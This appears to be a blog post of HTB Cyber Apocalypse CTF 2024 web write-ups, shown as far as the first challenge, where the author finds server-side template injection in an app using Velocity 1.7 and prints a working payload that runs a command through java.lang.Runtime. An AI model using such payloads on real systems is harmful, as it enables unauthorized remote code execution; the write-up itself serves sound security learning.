<!DOCTYPE html>
<html lang="en">
  <head prefix="og: https://ogp.me/ns#">
    <meta charset="utf-8" />
    <meta name="generator" content="gh:importantimport/urara" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="manifest" crossorigin="use-credentials" href="/manifest.webmanifest" />
    <link rel="alternate" type="application/feed+json" href="/feed.json" />
    <link rel="alternate" type="application/atom+xml" href="/atom.xml" />
    <link rel="sitemap" type="application/xml" href="/sitemap.xml" />
    <meta http-equiv="content-security-policy" content="style-src 'self' 'unsafe-inline' https://giscus.app">
		<link href="../../../_app/immutable/assets/0.4781e3d8.css" rel="stylesheet">
		<link rel="modulepreload" href="../../../_app/immutable/entry/start.ce49cd66.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/index.725d15e1.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/singletons.34182735.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/index.f6403797.js">
		<link rel="modulepreload" href="../../../_app/immutable/entry/app.bdfa4db1.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/preload-helper.41c905a7.js">
		<link rel="modulepreload" href="../../../_app/immutable/nodes/0.c7f340eb.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/posts.7eeb28a4.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/posts.d89605eb.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/icon.fa06396a.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/title.ff9679dd.js">
		<link rel="modulepreload" href="../../../_app/immutable/nodes/6.2f1a2614.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/post_layout.b6bd0bbf.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/post_card.004e8740.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/footer.a8ea1951.js"><title>Writeups for Web challenges from HTB Cyber Apocalypse CTF 2024 | ./khatta.sh | کھاتا</title><!-- HEAD_svelte-1592q3p_START --><link rel="me" href="https://kongwoo.icu/@seviche"><!-- HEAD_svelte-1592q3p_END --><!-- HEAD_svelte-1kxdj3d_START --><link rel="shortcut icon" href="https://blog.shameerkashif.me/favicon.png" sizes="48x48" type="image/png"><link rel="apple-touch-icon" href="https://blog.shameerkashif.me/assets/any@180.png" sizes="180x180" type="image/png"><link rel="icon" href="https://blog.shameerkashif.me/assets/any@192.png" sizes="192x192" type="image/png"><!-- HEAD_svelte-1kxdj3d_END --><!-- HEAD_svelte-1g590ms_START --><meta name="theme-color"><!-- HEAD_svelte-1g590ms_END --><!-- HEAD_svelte-abrfj_START --><meta name="author" content="@hash3liZer"><link rel="canonical" href="https://blog.shameerkashif.me/blog/2023/htb-cyber-apocalypse-ctf-2024-web-writeups">
    
    <meta name="keywords" content="ctf, cyber-apocalypse, htb, htb-2024, web">
    <meta name="description" content="This blog post contains the writeups for the web challenges that i solved from HTB Cyber Apocalypse 2024"><!-- HTML_TAG_START --><link rel="me" href="https://github.com/hash3liZer" /><!-- HTML_TAG_END --><!-- HTML_TAG_START --><script async src="https://www.googletagmanager.com/gtag/js?id=G-ZZRLH1SYB9"></script><script>window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag("js", new Date());gtag("config", "G-ZZRLH1SYB9");</script><!-- HTML_TAG_END --><!-- HEAD_svelte-abrfj_END --><!-- HEAD_svelte-4dky5b_START --><meta property="og:site_name" content="./khatta.sh | کھاتا"><meta property="og:locale" content="en"><meta property="og:type" content="article">
    <meta property="og:title" content="Writeups for Web challenges from HTB Cyber Apocalypse CTF 2024">
    <meta property="og:description" content="This blog post contains the writeups for the web challenges that i solved from HTB Cyber Apocalypse 2024">
    <meta property="og:image" content="https://github.com/hash3liZer/khatta/assets/29171692/d5abad92-0b61-4418-af4b-582a6d03044b">
      <meta name="twitter:card" content="summary_large_image">
    <meta property="article:tag" content="ctf"><meta property="article:tag" content="cyber-apocalypse"><meta property="article:tag" content="htb"><meta property="article:tag" content="htb-2024"><meta property="article:tag" content="web">
    <meta property="og:url" content="https://blog.shameerkashif.me/blog/2023/htb-cyber-apocalypse-ctf-2024-web-writeups">
    <meta property="article:author" content="@hash3liZer">
    <meta property="article:published_time" content="2024-03-14T00:00:00.000Z">
    <meta property="article:modified_time" content="2024-12-26T18:06:47.667Z"><!-- HEAD_svelte-4dky5b_END -->
  </head>

  <body itemscope itemtype="https://schema.org/WebPage">
    










<header id="header" class="fixed z-50 w-screen transition-all duration-500 ease-in-out border-b-2 border-transparent max-h-[4.125rem] false"><div class="navbar"><div class="navbar-start">

<div class="dropdown lg:hidden"><label for="navbar-dropdown" tabindex="0" class="btn btn-square btn-ghost"><span class="i-heroicons-outline-menu-alt-1"></span></label>
  <ul id="navbar-dropdown" tabindex="0" class="menu menu-compact dropdown-content bg-base-100 text-base-content shadow-lg rounded-box min-w-max max-w-52 p-2"><li><a href="/resume">About Me</a>
        </li><li><a href="https://shameerkashif.me">Who@mi ➡️</a>
        </li></ul></div>
<div class="swap order-last hidden lg:inline-grid"><button class="swap-on btn btn-ghost text-base font-normal normal-case transition-all duration-200 hidden"></button>
  <ul class="swap-off menu menu-horizontal p-0"><li><a class="!rounded-btn" href="/resume">About Me</a>
        </li><li><a class="!rounded-btn" href="https://shameerkashif.me">Who@mi ➡️</a>
        </li></ul></div>
        <a href="/" class="btn btn-ghost normal-case text-lg">./khatta.sh | کھاتا</a></div>
      <div class="navbar-end"><button aria-label="search" tabindex="0" class="btn btn-square btn-ghost"><span class="i-heroicons-outline-search"></span></button>
        <div id="change-theme" class="dropdown dropdown-end">
          
          <div tabindex="0" class="btn btn-square btn-ghost"><span class="i-heroicons-outline-color-swatch"></span></div>
          
          
          <ul tabindex="0" class="flex flex-nowrap shadow-2xl menu dropdown-content bg-base-100 text-base-content rounded-box w-52 p-2 gap-2 overflow-y-auto max-h-[21.5rem]"><button data-theme="lofi" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Light</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="dracula" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Dracula</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="coffee" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Coffee</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="cupcake" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Cupcake</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="valentine" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Valentine</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="aqua" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Aqua</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="synthwave" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Synthwave</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="night" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Night</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="garden" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Garden</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="lemonade" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Lemonade</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="cmyk" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">CMYK</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="retro" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Retro</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="black" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Black</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button></ul></div></div></div></header>

<button id="totop" aria-label="scroll to top" class="fixed grid group btn btn-circle btn-lg border-none backdrop-blur bottom-6 right-6 z-50 duration-500 ease-in-out btn-ghost bg-base-100/30 md:bg-base-200/30 translate-y-24"><div class="radial-progress text-accent transition-all duration-500 ease-in-out group-hover:text-accent-focus col-start-1 row-start-1" style="--size:4rem; --thickness: 0.25rem; --value:undefined;"></div>
  <div class="border-4 border-base-content/10 group-hover:border-transparent col-start-1 row-start-1 rounded-full w-full h-full p-4 grid duration-500 ease-in-out"><span class="i-heroicons-solid-chevron-up !w-6 !h-6"></span></div></button>

<div class="bg-base-100 md:bg-base-200 min-h-screen pt-16 md:pb-8 lg:pb-16">



<div class="flex flex-col flex-nowrap justify-center xl:flex-row xl:flex-wrap"><div class="flex-1 w-full order-first ease-out transform mx-auto xl:mr-0 xl:ml-0"></div>
  <div class="flex-1 w-full xl:order-last ease-out transform mx-auto xl:ml-0 xl:mr-0"></div>
  <div class="flex-none w-full max-w-screen-md mx-auto xl:mx-0"><article itemscope itemtype="https://schema.org/BlogPosting" itemprop="blogPost" class="h-entry card bg-base-100 rounded-none md:rounded-box md:shadow-lg md:shadow-grey-10 overflow-hidden z-10 md:mb-8 lg:mb-16"><div id="bridgy" class="hidden"><a href="https://brid.gy/publish/mastodon">mastodon</a></div>
  
  
  <div class="card-body gap-0 "><div class="flex flex-col gap-2"><figure class="md:order-last rounded-lg mb-4 flex-col gap-2 -mt-8 md:mt-0'
          }"><img src="https://github.com/hash3liZer/khatta/assets/29171692/d5abad92-0b61-4418-af4b-582a6d03044b" alt="https://github.com/hash3liZer/khatta/assets/29171692/d5abad92-0b61-4418-af4b-582a6d03044b" class="u-featured" loading="lazy" decoding="async"></figure>
      <div class="flex font-semibold gap-1.5"><a rel="author" class="opacity-75 hover:opacity-100 hover:text-primary duration-500 ease-in-out p-author h-card" href="https://blog.shameerkashif.me">@hash3liZer</a>
  <span class="opacity-50">/</span>
  <a href="/blog/2023/htb-cyber-apocalypse-ctf-2024-web-writeups" class="u-url u-uid swap group/time"><time class="group-hover/time:opacity-0 font-semibold opacity-75 duration-500 ease-in-out mr-auto dt-published" datetime="2024-03-14T00:00:00.000Z" itemprop="datePublished">Thu, Mar 14, 2024</time>
    <time class="opacity-0 group-hover/time:opacity-100 font-semibold text-primary duration-500 ease-in-out mr-auto dt-updated" datetime="2024-12-26T18:06:47.667Z" itemprop="dateModified">Thu, Dec 26, 2024</time></a></div>
      <h1 itemprop="name headline" class="card-title text-2xl mb-8 p-name">Writeups for Web challenges from HTB Cyber Apocalypse CTF 2024</h1>
      <p itemprop="description" class="p-summary mb-auto hidden">This blog post contains the writeups for the web challenges that i solved from HTB Cyber Apocalypse 2024</p></div>
    <main itemprop="articleBody" class="urara-prose prose e-content"><p>We just finished playing the HTB Cyber Apocalypse 2024. It was real fun. I wasn’t able to mainly solve 2 of the hard challenges. Neverthless, it was real fun and just like every other time, got new things to learn. I mainly focused on web and tried one challenge from Misc which i wasn’t able to solve. Anyhow, the writeups for some of the interesting web one’s that i sovled. </p>
<h2 id="web"><a href="#web">WEB</a></h2>
<h3 id="labyrinth-linguist---easy"><a href="#labyrinth-linguist---easy">Labyrinth Linguist - Easy</a></h3>
<p>I reviewed whole code. First thing i noticed is the use of <code>velocity</code> template engine in the application. Moreover, the version that was specified for usage was <code>1.7</code>:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" xml="true"><div class="language-id">xml</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">dependencies</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">  </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">dependency</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">groupId</span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF">org.springframework.boot</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">groupId</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">artifactId</span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF">spring-boot-starter-web</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">artifactId</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">  </span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">dependency</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">  </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">dependency</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">groupId</span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF">org.apache.velocity</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">groupId</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">artifactId</span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF">velocity</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">artifactId</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">version</span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF">1.7</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">version</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">  </span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">dependency</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">  </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">dependency</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">groupId</span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF">org.apache.velocity</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">groupId</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">artifactId</span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF">velocity</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">artifactId</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">version</span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF">1.7</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">version</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">  </span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">dependency</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">dependencies</span><span style="color: #89DDFF">&gt;</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>The specified version was quite an outdated version of the library. Now, first thing i did was try to read the code and look for any SSTIs. </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" java="true"><div class="language-id">java</div><div class='code-container'><code><div class='line'><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">String</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">readFileToString</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">String</span><span style="color: #EEFFFF"> filePath</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">String</span><span style="color: #EEFFFF"> replacement</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> throws IOException </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">StringBuilder</span><span style="color: #EEFFFF"> content </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">new</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">StringBuilder</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">BufferedReader</span><span style="color: #EEFFFF"> bufferedReader </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">null;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">try</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        bufferedReader </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">new</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">BufferedReader</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">new</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">FileReader</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">filePath</span><span style="color: #89DDFF">));</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #C792EA">String</span><span style="color: #EEFFFF"> line</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">        </span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">while</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">((</span><span style="color: #EEFFFF">line </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> bufferedReader</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">readLine</span><span style="color: #89DDFF">())</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">!=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">null)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">            line </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> line</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">replace</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">TEXT</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> replacement</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">            content</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">append</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">line</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">            content</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">append</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF">&#92;n</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">finally</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">bufferedReader </span><span style="color: #89DDFF">!=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">null)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #89DDFF">try</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">                bufferedReader</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">close</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">catch</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #C792EA">IOException</span><span style="color: #EEFFFF"> e</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">                e</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">printStackTrace</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> content</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">toString</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>So, we definitely are replacing the the word <code>TEXT</code> with the our input. And later on this code was processed here: </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" java="true"><div class="language-id">java</div><div class='code-container'><code><div class='line'><span style="color: #C792EA">org</span><span style="color: #89DDFF">.</span><span style="color: #C792EA">apache</span><span style="color: #89DDFF">.</span><span style="color: #C792EA">velocity</span><span style="color: #89DDFF">.</span><span style="color: #C792EA">Template</span><span style="color: #EEFFFF"> t </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">new</span><span style="color: #EEFFFF"> org</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">apache</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">velocity</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Template</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #EEFFFF">t</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">setRuntimeServices</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">runtimeServices</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #89DDFF">try</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">  t</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">setData</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">runtimeServices</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">parse</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">reader</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">home</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">));</span></div><div class='line'><span style="color: #EEFFFF">  t</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">initDocument</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #EEFFFF">  </span><span style="color: #C792EA">VelocityContext</span><span style="color: #EEFFFF"> context </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">new</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">VelocityContext</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #EEFFFF">  context</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">put</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">name</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">World</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">);</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">  </span><span style="color: #C792EA">StringWriter</span><span style="color: #EEFFFF"> writer </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">new</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">StringWriter</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #EEFFFF">  t</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">merge</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">context</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> writer</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">  template </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> writer</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">toString</span><span style="color: #89DDFF">();</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">catch</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #C792EA">ParseException</span><span style="color: #EEFFFF"> e</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">  e</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">printStackTrace</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>At first i confirmed the injection by providing the <code>$name</code> value to the <code>text</code> parameter and it replaced it with <code>world</code>. Now, doing a bit of googling, i discovered a <code>CVE</code> for this specific version of <code>Velocity</code>.
I used the following payload with the name param</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("whoami")</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>I used curl to execute the payload and got the right execution: </p>
